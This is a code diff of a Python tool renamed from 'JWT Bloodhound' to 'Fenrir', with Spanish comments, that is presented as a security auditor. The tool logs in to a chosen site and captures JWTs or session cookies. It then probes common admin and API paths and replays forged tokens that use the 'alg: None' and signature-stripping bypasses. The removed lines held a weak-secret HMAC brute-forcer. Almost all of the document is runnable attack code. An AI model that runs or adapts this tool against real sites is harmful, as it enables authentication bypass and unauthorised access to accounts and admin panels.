@@ -14,16 +14,16 @@ from enum import Enum, auto
 from functools import wraps
 
 # ==============================================================================
-#  🏗️ CORE ARCHITECTURE & UTILS
+#  🛠️ CONFIGURACIÓN & UTILS (ARCHITECT LEVEL)
 # ==============================================================================
 
-# Configuración de Logging profesional, nada de print() crudos por ahí
+# Configuración de Logging para no perder detalle sin ensuciar la consola
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
     datefmt="%H:%M:%S"
 )
-logger = logging.getLogger("BLOODHOUND")
+logger = logging.getLogger("FENRIR")
 
 class Colors:
     RED = "\033[91m"
@@ -39,62 +39,55 @@ def colorize(text: str, color: str) -> str:
 # --- DECORATORS ---
 
 def audit_log(func: Callable[..., Any]) -> Callable[..., Any]:
-    """Decorador para registrar la ejecución de métodos críticos."""
+    """Decorador para trazar operaciones críticas de seguridad."""
     @wraps(func)
     def wrapper(*args, **kwargs):
-        # Usamos introspección para saber qué método se llama
+        # Introspección: Vemos qué método se llama
         method_name = func.__name__.upper()
-        logger.debug(f"Ejecutando operación crítica: {method_name}")
+        logger.debug(f"⚡ Ejecutando vector: {method_name}")
         return func(*args, **kwargs)
     return wrapper
 
 def async_timer(func: Callable[..., Coroutine]) -> Callable[..., Coroutine]:
-    """Decorador asíncrono para medir tiempos de respuesta (Latency Tracking)."""
+    """Decorador de telemetría para medir latencia de red."""
     @wraps(func)
     async def wrapper(*args, **kwargs):
         start = time.perf_counter()
         result = await func(*args, **kwargs)
         end = time.perf_counter()
         elapsed = (end - start) * 1000
-        # Solo logueamos si es lento (>500ms), para no saturar
-        if elapsed > 500:
-            logger.warning(f"🐢 {func.__name__} tomó {elapsed:.2f}ms")
+        if elapsed > 800: # Solo avisar si es lento
+            logger.warning(f"🐢 Latencia alta en {func.__name__}: {elapsed:.2f}ms")
         return result
     return wrapper
 
-# --- DATA STRUCTURES (DDD - Domain Driven Design Lite) ---
+# --- DATA STRUCTURES (DDD) ---
 
-class Severity(Enum):
-    INFO = auto()
-    LOW = auto()
-    HIGH = auto()
-    CRITICAL = auto()
+class AuthMode(Enum):
+    NONE = auto()
+    JWT = auto()    # Modo Moderno (API)
+    COOKIE = auto() # Modo Legacy (WordPress/PrestaShop clásico)
 
 @dataclass(frozen=True)
 class TargetConfig:
     """Configuración inmutable del objetivo."""
     base_url: str
-    user_agent: str = "Bloodhound/4.0-Architect"
-    timeout: int = 10
+    user_agent: str = "Fenrir/2.0-Architect"
+    timeout: int = 15
 
 @dataclass
-class ScanResult:
-    """DTO para transferir resultados de escaneo."""
-    endpoint: str
-    status_code: int
-    payload: Optional[str] = None
-    severity: Severity = Severity.INFO
-
-    def __str__(self) -> str:
-        icon = "🔥" if self.severity == Severity.CRITICAL else "ℹ️"
-        return f"{icon} [{self.status_code}] {self.endpoint} -> {self.severity.name}"
+class AuthResult:
+    """DTO para el resultado de la autenticación."""
+    mode: AuthMode
+    artifact: str  # Token JWT o nombre de la Cookie principal
+    success: bool
 
 # ==============================================================================
-#  🧠 BUSINESS LOGIC: ATTACK VECTORS
+#  🧠 BUSINESS LOGIC: LOW LEVEL MANIPULATION
 # ==============================================================================
 
 class JWTManipulator:
-    """Clase estática (Utilities) para manipulación de bajo nivel de JWT."""
+    """Utilidades estáticas para cirugía de tokens."""
     
     @staticmethod
     def b64url_decode(data: str) -> bytes:
@@ -115,194 +108,204 @@ class JWTManipulator:
         return f"{h_b64}.{p_b64}.{s_b64}"
 
 # ==============================================================================
-#  🚀 CORE ENGINE
+#  🐺 CORE ENGINE: FENRIR
 # ==============================================================================
 
-class BloodhoundEngine:
+class FenrirEngine:
     """
-    Motor principal. Usa Context Manager asíncrono para gestión de recursos.
-    Implementa el patrón Facade para simplificar la interfaz de uso.
+    Motor híbrido de auditoría.
+    Implementa Context Manager asíncrono y Strategy Pattern para auth.
     """
     
     def __init__(self, config: TargetConfig):
         self.config = config
         self.session: Optional[aiohttp.ClientSession] = None
         self._token: Optional[str] = None
+        self.auth_mode: AuthMode = AuthMode.NONE
 
     async def __aenter__(self):
+        # CookieJar inseguro para aceptar cookies sin rechistar
+        jar = aiohttp.CookieJar(unsafe=True)
         connector = aiohttp.TCPConnector(limit=50, ssl=False) # High concurrency
+        
         self.session = aiohttp.ClientSession(
             base_url=self.config.base_url,
             connector=connector,
+            cookie_jar=jar, # <--- MEMORIA DE COOKIES AUTOMÁTICA
             headers={"User-Agent": self.config.user_agent},
             timeout=aiohttp.ClientTimeout(total=self.config.timeout)
         )
         return self
 
     async def __aexit__(self, exc_type, exc_val, exc_tb):
-        if self.session:
-            await self.session.close()
+        if self.session: await self.session.close()
 
     @property
     def token(self) -> str:
-        if not self._token:
-            raise ValueError("Token no establecido. Ejecuta autenticación primero.")
-        return self._token
+        return self._token if self._token else ""
 
     @token.setter
     def token(self, value: str):
         self._token = value
-        # Actualizamos headers de la sesión globalmente
-        if self.session:
+        # Si forzamos un token, asumimos modo JWT
+        if self.session and value:
             self.session.headers.update({"Authorization": f"Bearer {value}"})
+            self.auth_mode = AuthMode.JWT
 
     @async_timer
     async def pre_flight_check(self) -> bool:
-        """Verificación rápida de tecnología."""
+        """Ping rápido para ver si el host está vivo."""
         print(colorize("\n🧠 FASE 0: PRE-FLIGHT CHECK", Colors.BOLD))
         if not self.session: raise RuntimeError("Session not initialized")
-
-        target = "/wp-json/jwt-auth/v1/token"
         try:
-            async with self.session.post(target) as resp:
-                if resp.status == 404:
-                    logger.info("WordPress JWT plugin no detectado.")
-                    return False
-                print(colorize(f"✅ Endpoint activo: {resp.status}", Colors.GREEN))
+            async with self.session.get("/") as resp:
+                print(colorize(f"✅ Host activo: {resp.status}", Colors.GREEN))
                 return True
         except Exception as e:
-            logger.error(f"Error de conexión: {str(e)}")
+            logger.critical(f"Host inalcanzable: {str(e)}")
             return False
 
     @audit_log
-    async def hunt_credentials(self, login_path: str, creds: Dict[str, str]) -> Optional[str]:
-        """Intenta obtener credenciales y extraer el token."""
-        print(colorize(f"🕵️  Cazando token en: {login_path}", Colors.YELLOW))
+    async def hunt_credentials(self, login_path: str, creds: Dict[str, str]) -> AuthResult:
+        """
+        Lógica híbrida: Intenta login y detecta si recibe Token (Moderno) o Cookie (Legacy).
+        """
+        print(colorize(f"🕵️  Cazando credenciales en: {login_path}", Colors.YELLOW))
         
         if not self.session: raise RuntimeError("Session not initialized")
 
         try:
-            # Intentamos JSON primero
+            # ESTRATEGIA A: JSON POST (APIs Modernas)
             async with self.session.post(login_path, json=creds) as resp:
                 text = await resp.text()
-                if resp.status == 200:
-                    return self._extract_token_regex(text)
                 
-            # Fallback a Form Data
-            async with self.session.post(login_path, data=creds) as resp:
-                text = await resp.text()
-                if resp.status == 200:
-                    return self._extract_token_regex(text)
+                # 1. ¿Hay JWT en la respuesta?
+                token = self._extract_token_regex(text)
+                if token:
+                    print(colorize("✅ [JWT] Token capturado. Modo API.", Colors.GREEN))
+                    return AuthResult(AuthMode.JWT, token, True)
+                
+                # 2. ¿Hay Cookies en la respuesta?
+                if self.session.cookie_jar.filter_cookies(self.config.base_url):
+                    print(colorize("✅ [COOKIE] Sesión (JSON). Modo Legacy.", Colors.GREEN))
+                    self._print_cookies()
+                    return AuthResult(AuthMode.COOKIE, "SessionCookie", True)
+
+            # ESTRATEGIA B: FORM DATA (Legacy WordPress/PrestaShop)
+            print("   ⚠️ JSON falló o no dio auth. Probando Form Data estándar...")
+            async with self.session.post(login_path, data=creds) as resp_form:
+                 # Chequeo de Cookies post-form
+                 if self.session.cookie_jar.filter_cookies(self.config.base_url):
+                    print(colorize("✅ [COOKIE] Sesión (Form). Modo Legacy.", Colors.GREEN))
+                    self._print_cookies()
+                    return AuthResult(AuthMode.COOKIE, "SessionCookie", True)
+                 
+                 # Último intento: A veces el token viene en el HTML del redirect
+                 text_form = await resp_form.text()
+                 token = self._extract_token_regex(text_form)
+                 if token:
+                     print(colorize("✅ [JWT] Token oculto en HTML.", Colors.GREEN))
+                     return AuthResult(AuthMode.JWT, token, True)
 
         except Exception as e:
-            logger.error(f"Fallo en autenticación: {e}")
+            logger.error(f"Error durante autenticación: {e}")
         
-        return None
+        return AuthResult(AuthMode.NONE, "", False)
 
     def _extract_token_regex(self, content: str) -> Optional[str]:
         match = re.search(r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+', content)
-        if match:
-            t = match.group(0)
-            print(colorize("✅ TOKEN OBTENIDO", Colors.GREEN))
-            return t
-        return None
+        return match.group(0) if match else None
+
+    def _print_cookies(self):
+        if not self.session: return
+        for cookie in self.session.cookie_jar:
+            print(f"   🍪 {cookie.key}: {cookie.value[:15]}...")
 
     async def fuzz_endpoints(self, wordlist: List[str]) -> List[str]:
-        """Fuzzing concurrente usando asyncio.gather."""
-        print(colorize("\n🐕 SOLTANDO AL SABUESO (ASYNC)...", Colors.BOLD))
+        """Discovery asíncrono masivo."""
+        mode_str = self.auth_mode.name
+        print(colorize(f"\n🐕 RASTREANDO ({mode_str})...", Colors.BOLD))
         
         tasks = [self._check_endpoint(path) for path in wordlist]
-        # Ejecutamos todas las peticiones en paralelo real
         results = await asyncio.gather(*tasks)
-        
-        # Filtramos los None
         found = [r for r in results if r is not None]
         
         if not found:
-            print(colorize("🤷 Sin presas. Usando root.", Colors.CYAN))
-            return ["/"]
+            print(colorize("🤷 Sin presas claras.", Colors.CYAN))
         return found
 
     async def _check_endpoint(self, path: str) -> Optional[str]:
         if not self.session: return None
         try:
-            async with self.session.get(path) as resp:
-                if resp.status in [200, 401, 403]:
-                    print(f"  -> {colorize(str(resp.status), Colors.RED)} en {path}")
+            # Allow_redirects=False para detectar redirecciones de auth (302)
+            async with self.session.get(path, allow_redirects=True) as resp:
+                status = resp.status
+                if status == 200:
+                    print(f"  -> {colorize('ACCESIBLE [200]', Colors.GREEN)} {path}")
                     return path
-        except:
-            pass
+                elif status == 403:
+                    print(f"  -> {colorize('PROTEGIDO [403]', Colors.YELLOW)} {path}")
+                    return path
+                elif status == 401:
+                    print(f"  -> {colorize('AUTH REQ [401]', Colors.RED)} {path}")
+        except: pass
         return None
 
-    # --- ATTACK VECTORS (CLOSURES & GENERATORS) ---
+    # --- ATTACK MODULES ---
 
-    def _generate_attacks(self) -> Generator[Dict[str, Any], None, None]:
-        """
-        Generador que yielda configuraciones de ataque. 
-        Esto desacopla la creación del payload de la ejecución.
-        """
+    def _generate_jwt_attacks(self) -> Generator[Dict[str, Any], None, None]:
+        """Generador de payloads para ataque JWT."""
+        if not self.token: return
         parts = self.token.split('.')
-        header = json.loads(JWTManipulator.b64url_decode(parts[0]))
-        payload = json.loads(JWTManipulator.b64url_decode(parts[1]))
+        if len(parts) != 3: return
 
-        # Attack 1: None Algo
-        h_none = header.copy(); h_none['alg'] = 'None'
-        yield {
-            "name": "Algorithm None",
-            "token": JWTManipulator.forge_token(h_none, payload)
-        }
+        try:
+            header = json.loads(JWTManipulator.b64url_decode(parts[0]))
+            payload = json.loads(JWTManipulator.b64url_decode(parts[1]))
+            
+            # 1. Algoritmo None
+            h_none = header.copy(); h_none['alg'] = 'None'
+            yield {
+                "name": "Algorithm None Bypass",
+                "token": JWTManipulator.forge_token(h_none, payload)
+            }
+            
+            # 2. Stripped Signature
+            yield {
+                "name": "Signature Stripping",
+                "token": f"{parts[0]}.{parts[1]}."
+            }
 
-        # Attack 2: Stripped Signature
-        yield {
-            "name": "Signature Stripping",
-            "token": f"{parts[0]}.{parts[1]}."
-        }
-        
-        # Attack 3: Brute Force (Simplificado para demo)
-        # Aquí normalmente iría una lógica más compleja
-        yield {
-            "name": "Weak Secret Check",
-            "check_func": lambda: self._brute_force_secret(parts, ["secret", "123456", "admin"])
-        }
-
-    def _brute_force_secret(self, parts: List[str], wordlist: List[str]) -> Optional[str]:
-        msg = f"{parts[0]}.{parts[1]}".encode()
-        sig = JWTManipulator.b64url_decode(parts[2])
-        
-        for secret in wordlist:
-            if hmac.new(secret.encode(), msg, hashlib.sha256).digest() == sig:
-                return secret
-        return None
+        except Exception as e:
+            logger.error(f"Error generando ataques: {e}")
 
     async def execute_attacks(self, targets: List[str]):
-        """Orquestador de ataques."""
-        print(colorize("\n⚔️  INICIANDO FASE DE ATAQUE", Colors.BOLD))
+        print(colorize("\n⚔️  FASE DE ATAQUE", Colors.BOLD))
         
-        for target_url in targets:
-            print(f"🎯 Target: {target_url}")
-            
-            for attack in self._generate_attacks():
-                if "token" in attack:
-                    # Ataque de repetición con token modificado
-                    await self._send_attack(target_url, attack["token"], attack["name"])
-                elif "check_func" in attack:
-                    # Ataque local (cracking)
-                    res = attack["check_func"]()
-                    if res:
-                         print(colorize(f"  🔥 [CRITICAL] CLAVE: '{res}'", Colors.RED))
+        if self.auth_mode == AuthMode.COOKIE:
+            print(colorize("ℹ️ Modo Cookie activo: Ataques criptográficos JWT omitidos.", Colors.CYAN))
+            print("   (Se ha verificado el acceso; intenta buscar endpoints sensibles manualmente).")
+            return
 
-    async def _send_attack(self, url: str, token: str, attack_name: str):
+        if self.auth_mode == AuthMode.JWT:
+            print("🔥 Iniciando manipulación de Token...")
+            for target_url in targets:
+                print(f"🎯 Target: {target_url}")
+                for attack in self._generate_jwt_attacks():
+                    await self._send_jwt_attack(target_url, attack["token"], attack["name"])
+
+    async def _send_jwt_attack(self, url: str, token: str, attack_name: str):
         if not self.session: return
         try:
-            # Override headers just for this request
+            # Sobrescribimos header solo para esta petición
             headers = {"Authorization": f"Bearer {token}"}
             async with self.session.get(url, headers=headers) as resp:
                 if resp.status == 200:
                      print(colorize(f"  🎉 [VULNERABLE] {attack_name}: BYPASS EXITOSO", Colors.GREEN))
                 else:
+                    # Logging silencioso para no saturar
                     logger.debug(f"{attack_name} falló con {resp.status}")
-        except Exception:
-            pass
+        except Exception: pass
 
 # ==============================================================================
 #  🏁 MAIN ENTRY POINT
@@ -310,54 +313,75 @@ class BloodhoundEngine:
 
 async def main():
     print(colorize("""
-    🩸 JWT BLOODHOUND v4.0 - ARCHITECT EDITION 🩸
+    🐺  F E N R I R   v 2.0  🐺
+    [ Hybrid Security Auditor ]
     """, Colors.RED))
 
-    # Input handling (simulado para limpieza, en prod usaríamos argparse/click)
-    base_url = input(">> URL Base: ").strip()
+    # Input Handling
+    base_url = input(">> URL Base (ej: https://miweb.com): ").strip()
     if not base_url.startswith("http"): base_url = f"http://{base_url}"
     
     config = TargetConfig(base_url=base_url)
 
-    # El Context Manager se encarga de abrir/cerrar conexiones
-    async with BloodhoundEngine(config) as engine:
+    # Context Manager inicia la sesión
+    async with FenrirEngine(config) as engine:
         
         # 1. Pre-flight
-        should_continue = await engine.pre_flight_check()
-        if not should_continue:
-            if input(">> ¿Continuar de todos modos? (s/N): ").lower() != 's':
+        if not await engine.pre_flight_check():
+            if input(">> ¿Continuar a ciegas? (s/N): ").lower() != 's':
                 sys.exit(0)
 
         # 2. Auth Flow
-        choice = input("\n[1] Pegar Token  [2] Auto-Login\n>> ").strip()
-        if choice == '2':
-            user = input("User: ")
-            pwd = input("Pass: ")
-            # Usamos un heurístico simple para la URL de login
-            login_url = "/auth/login" if "/api" in base_url else "/wp-json/jwt-auth/v1/token"
-            
-            token = await engine.hunt_credentials(login_url, {"username": user, "password": pwd})
-        else:
-            token = input(">> Token JWT: ").strip()
+        print("\n[1] Auto-Login (Inteligente - JWT/Cookie)")
+        print("[2] Pegar Token JWT Manual")
+        choice = input(">> Opción: ").strip()
 
-        if not token:
-            print(colorize("❌ No hay token, no hay fiesta.", Colors.RED))
-            sys.exit(1)
-        
-        engine.token = token # Setter con lógica de actualización de headers
+        if choice == '1':
+            user = input("User/Email: ")
+            pwd = input("Password: ")
+            login_path = input(">> Login Path (Enter para default): ").strip()
+            
+            # Heurística simple de login path si está vacío
+            if not login_path:
+                if "wp-" in base_url or "wordpress" in base_url: login_path = "/wp-login.php"
+                elif "prestashop" in base_url: login_path = "/admin/index.php" # Simplificado
+                else: login_path = "/auth/login"
+            
+            # Credenciales genéricas para probar JSON y Form
+            creds = {"email": user, "username": user, "password": pwd}
+            
+            auth_result = await engine.hunt_credentials(login_path, creds)
+            
+            if auth_result.success:
+                engine.auth_mode = auth_result.mode
+                if auth_result.mode == AuthMode.JWT:
+                    engine.token = auth_result.artifact
+            else:
+                print(colorize("❌ Autenticación fallida. Revisa URL o credenciales.", Colors.RED))
+                sys.exit(1)
+
+        else:
+            token = input(">> Pega tu Token: ").strip()
+            if not token: sys.exit(1)
+            engine.token = token # Setter configura AuthMode.JWT
 
         # 3. Discovery & Attack
-        targets = await engine.fuzz_endpoints([
-            "/admin", "/dashboard", "/api/v1/user", "/secure", "/profile"
-        ])
+        # Lista ampliada para cubrir CMS clásicos y APIs
+        common_paths = [
+            "/admin", "/administrator", "/dashboard", "/backoffice",
+            "/api/v1/users", "/api/v1/profile", "/wp-admin/profile.php",
+            "/user/settings", "/account", "/secure"
+        ]
         
+        targets = await engine.fuzz_endpoints(common_paths)
         await engine.execute_attacks(targets)
 
 if __name__ == "__main__":
     try:
-        # Cross-platform async loop
         if sys.platform == 'win32':
             asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n👋 Interrupción manual.")
+        print("\n👋 Operación abortada.")
+    except Exception as e:
+        print(f"\n❌ Error fatal: {e}")
